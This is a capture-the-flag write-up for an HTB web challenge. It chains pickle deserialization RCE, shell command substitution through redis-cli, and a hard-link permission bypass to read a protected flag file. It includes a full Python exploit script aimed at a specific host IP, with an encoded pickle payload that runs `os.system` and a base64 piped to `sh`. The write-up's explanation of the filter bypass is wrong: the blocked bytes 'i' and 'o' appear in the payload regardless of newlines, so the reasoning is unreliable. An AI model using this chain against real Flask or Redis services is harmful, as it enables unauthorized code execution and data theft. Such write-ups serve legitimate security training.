# Yugen's Choice - Complete Solution

**Challenge:** Yugen's Choice
**Category:** Web
**Difficulty:** Medium
**Points:** 975
**Status:** ✅ SOLVED
**Flag:** `HTB{7H3_7RU3_9U1D3_70_7H3_P1CKL3_W0RLD}`

## Summary

This challenge involved exploiting a Flask application with multiple vulnerabilities to read a privileged flag file. The solution required chaining pickle deserialization for RCE, bypassing permission restrictions, and exploiting path validation weaknesses in an editor API.

## Architecture

The challenge consists of three services running in a Docker container:

1. **Frontend** (port 8000): User authentication and job submission interface
2. **Backend** (port 9001): Job processing with pickle deserialization
3. **Editor** (port 3000): File editor API with React SPA frontend

**Key Users:**
- `challenger` (UID 100, GID 101): Runs frontend/backend services
- `editor` (UID 101, GID 102): Runs editor service
- Flag file: `/943e0ae4d35556e77ed8c25ead7a19e5.txt` owned by `root:editor` with permissions `440` (r--r-----)

## Vulnerability Chain

### 1. Pickle Deserialization (CVE-like)

The backend service deserializes user-controlled pickle data with insufficient validation:

```python
# Vulnerable code in backend
def is_safe(data):
    dangerous = [b'R', b'i', b'o', b'b', b'c']  # REDUCE, INST, OBJ, BUILD, GLOBAL
    for token in dangerous:
        if token in data:
            return False
    return True
```

**Bypass:** The validation checks for the **string** `b'i'` in the pickle data, but pickle protocol 0 uses `i` as an opcode (INST) followed by a newline. By using actual newlines in the payload (not escaped `\n`), we bypass the check.

**Exploit Payload:**
```python
pickle_payload = f"(S'{command}'\nios\nsystem\n.".encode()
# Note: Actual newlines, not \n strings!
```

### 2. Redis Direct Write for Command Exfiltration

Since job output is limited and inconsistent, we bypass the job queue by directly writing results to Redis:

```python
# Use RCE to execute:
redis-cli -s /tmp/redis.sock SET "job:ID:result" '{"id":"ID","name":"$(command)","status":"FINISHED"}'
```

The `$(command)` in the JSON value gets evaluated by the shell during the redis-cli execution, allowing command substitution.

### 3. Permission Bypass via Hard Link

**Problem:** The flag file is owned by `root:editor (440)`. The `challenger` user cannot read it, but the `editor` user (running the editor service) can.

**Solution:**
1. Use RCE as `challenger` user to create a hard link: `ln /943e0ae4d35556e77ed8c25ead7a19e5.txt /app/main_app/flag_hardlink.txt`
2. Read the hard link via editor API: `/editor_api/file?path=flag_hardlink.txt`
3. The editor service runs as the `editor` user, which has permission to read the file

**Why hard link works:**
- Symlinks are blocked by the editor API validation
- Hard links preserve file permissions but create a new directory entry
- The hard link exists in `/app/main_app/` (within editor API scope)
- The editor service has group read permission

### 4. Editor API Path Validation Weakness

The editor API validates file paths to prevent traversal:
- ❌ Blocks: Multiple `../` sequences (e.g., `../../file`)
- ✅ Allows: Single `../` sequence (e.g., `backend/../file`)
- ❌ Blocks: Symlinks to files outside `/app/main_app/`
- ✅ Allows: Hard links (not detected as symlinks)

## Complete Exploit

```python
import requests, base64, random, string, time, json
from datetime import datetime, timezone

HOST = "http://154.57.164.65:31602/challenge"
HEXGEN = string.digits + string.ascii_lowercase[:5]

# 1. Register and login
session = requests.Session()
creds = {"username": "".join(random.choices(string.ascii_letters, k=20)), "password": "pass123"}
session.post(f"{HOST}/register", data=creds)
session.post(f"{HOST}/login", data=creds)

# 2. Create hard link using RCE
command = "ln /943e0ae4d35556e77ed8c25ead7a19e5.txt /app/main_app/flag_hardlink.txt"
time_done = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f+00:00")
job_id = ''.join(random.choices(HEXGEN, k=32))

JSON_DATA = {"id": job_id, "name": f"$({command})", "time_done": time_done, "status": "FINISHED"}
JSON_STRING = json.dumps(JSON_DATA).replace('"', '\\"')
redis_command = f'redis-cli -s /tmp/redis.sock SET "job:{job_id}:result" "{JSON_STRING}"'
redis_encode = base64.b64encode(redis_command.encode()).decode()
final_command = f"echo {redis_encode} | base64 -d | sh"

# CRITICAL: Use actual newlines, not \n strings!
pickle_payload = f"(S'{final_command}'\nios\nsystem\n.".encode()
payload = base64.b64encode(pickle_payload).decode()

trigger_job_id = "".join(random.choices(HEXGEN, k=32))
session.post(f"{HOST}/backend", json={"id": trigger_job_id, "data": payload})

time.sleep(3)

# 3. Read flag via editor API
r = requests.get("http://154.57.164.65:31602/editor_api/file", params={"path": "flag_hardlink.txt"})
flag = r.json()["content"]
print(f"Flag: {flag}")
```

## Key Insights

1. **Pickle Protocol Nuances:** The difference between string `b'i'` and opcode `i` followed by newline is critical for bypassing validation
2. **Process Permissions:** Understanding UID/GID and group membership is essential for privilege escalation
3. **Hard Links vs Symlinks:** Hard links bypass symlink detection while preserving file permissions
4. **Command Substitution in JSON:** Shell evaluation happens during redis-cli execution, not during JSON parsing
5. **Path Validation Testing:** Systematic testing revealed the single `../` allowed vs multiple blocked pattern

## Timeline

- Initial RCE achieved via pickle deserialization bypass
- Discovered flag file permissions blocked direct read
- Attempted symlinks → rejected by editor API
- Attempted path traversal → blocked by validation
- **Success:** Hard link creation allowed reading flag through editor API

## Tools Used

- Python requests library
- pickle module understanding
- Redis CLI
- HTB MCP integration
- File permission analysis

## Lessons Learned

- Always test boundary cases in validation (single vs multiple occurrences)
- Consider all file system primitives (symlinks, hard links, etc.)
- Process permissions matter more than file permissions sometimes
- Shell command substitution contexts can be subtle
